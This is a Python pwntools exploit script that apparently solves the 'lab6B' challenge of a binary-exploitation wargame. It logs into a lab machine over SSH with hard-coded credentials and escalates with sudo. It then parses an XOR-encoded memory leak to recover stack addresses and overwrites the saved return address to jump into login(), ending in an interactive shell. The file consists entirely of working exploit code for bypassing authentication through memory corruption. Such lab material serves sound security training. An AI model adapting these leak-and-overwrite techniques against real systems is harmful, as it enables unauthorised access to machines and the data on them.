#!/usr/bin/env python3
#
# pip3 install pwntools==4.1.0
#

import sys

from pwn import *

def main():

  session = ssh(host="192.168.159.150", user="gameadmin", password="gameadmin")
  sh = session.process('/bin/sh', env={'PS1':''})

  # login to the remote server as root (we're debugging locally)
  sh.sendline("sudo -s")
  sh.read()
  sh.sendline("gameadmin")
  sh.read()

  # start the lab6B binary
  sh.sendline("/levels/lab06/lab6B")
  sh.read()

  stager = generate_buffer()

  sh.sendline(stager[0])
  sh.read()
  sh.sendline(stager[1])
  line = sh.read()

  if b"Authentication failed" in line:
    stager = generate_buffer(parse_info_leak(line), 0xdeadbeef)
  else:
    log.failure("Exploitation failed run again")
    exit(-1)

  sh.sendline(b"%s" % stager[0])
  sh.read()
  sh.sendline(b"%s" % stager[1])
  sh.read()

  while True:
    sh.sendline('\n')
    if b"WELCOME" in sh.read():
      break
  
  log.success("Exploitation complete")
  sh.interactive()

def generate_buffer(var_addrs=None, return_address=0x00000000):

  offset = b"B" * 12
  buffers = ["", ""]
  buffer_size = 32

  buffers[0] = b"A" * buffer_size

  if (return_address == 0xdeadbeef):

    login_addr = var_addrs["nohash"]["ret_addr"] - 0x48a
    log.info("login() at 0x%02x, overwriting return address" % login_addr)

    local_14 = struct.pack("<I", generate_addr(var_addrs["hashed"]["local_14"], 0xdeadbeef))
    local_10 = struct.pack("<I", generate_addr(var_addrs["hashed"]["local_10"], 0xfffffffe))
    ret_addr = struct.pack("<I", generate_addr(var_addrs["hashed"]["ret_addr"], login_addr))

  else:

    local_14 = b"BBBB"
    local_10 = b"BBBB"
    ret_addr = b"B"

  payload_buffer = (b"%b%b%b%b" % (local_14, local_10, offset, ret_addr))
  rest = b"B" * (buffer_size - (
    len(payload_buffer)
    )
  )

  buffers[1] = payload_buffer + rest

  return buffers

def generate_addr(current_address, wanted_address):

  log.info("Generating address buffers:")

  hex_str = hex(current_address)[2:]
  c_array = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]

  hex_str = hex(wanted_address)[2:]
  w_array = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]

  for i in range(4):
    # Obtain value A - later to be XOR'd by in-memory byte
    c = int(c_array[i], 16)
    w = int(w_array[i], 16)
    w_array[i] = find_byte(c, w)

    w_array[i] = find_byte(0x41, w_array[i])
    log.info("  Sending: 0x%02x" % (w_array[i]))

  return format_address(w_array)

def find_byte(static_byte, wanted_byte):

  byte = 0
  for i in range(266):
    if ( (static_byte ^ i) == wanted_byte ):
      byte = i

  if byte == 0:
    log.failure("failed to generate byte 0x%02x" % wanted_byte)

  return byte

def parse_info_leak(leak):

  variables =\
  {
    "hashed": { "local_14": 0x00000000, "local_10": 0x00000000, "ret_addr": 0x00000000 },
    "nohash": { "local_14": 0x00000000, "local_10": 0x00000000, "ret_addr": 0x00000000 }
  }

  # XOR decrypt the leak, with 0x03 (A ^ B == 0x03)
  nohash = bytearray()
  for i in range(len(leak)):
    nohash.append(leak[i] ^ 0x03)

  # Extract the hashed values (this is what is currently stored in memory)
  i = leak.find(b"\xfc\xfc\xfc\xfc")
  j = nohash.find(b"\xff\xff\xff\xff")

  variables["hashed"]["local_14"] = format_address(leak[i:   ][:4][::-1])
  variables["hashed"]["local_10"] = format_address(leak[i+4: ][:4][::-1])
  variables["hashed"]["ret_addr"] = format_address(leak[i+20:][:4][::-1])

  variables["nohash"]["local_14"] = format_address(nohash[i:   ][:4][::-1])
  variables["nohash"]["local_10"] = format_address(nohash[i+4: ][:4][::-1])
  variables["nohash"]["ret_addr"] = format_address(nohash[i+20:][:4][::-1])

  log.info("local_14 was at 0x%x is now 0x%x" % (variables["nohash"]["local_14"], variables["hashed"]["local_14"]))
  log.info("local_10 was at 0x%x is now 0x%x" % (variables["nohash"]["local_10"], variables["hashed"]["local_10"]))
  log.info("main() was at 0x%x is now 0x%x" % (variables["nohash"]["ret_addr"], variables["hashed"]["ret_addr"]))

  return variables

def format_address(str_buff):
 
  try:
    int_fmt = int("0x{:02x}{:02x}{:02x}{:02x}".format(
      str_buff[0], str_buff[1],
      str_buff[2], str_buff[3]),
    16)
  except:
    log.failure("Failed to format address, run again")
    exit(-1)

  return int_fmt

main()
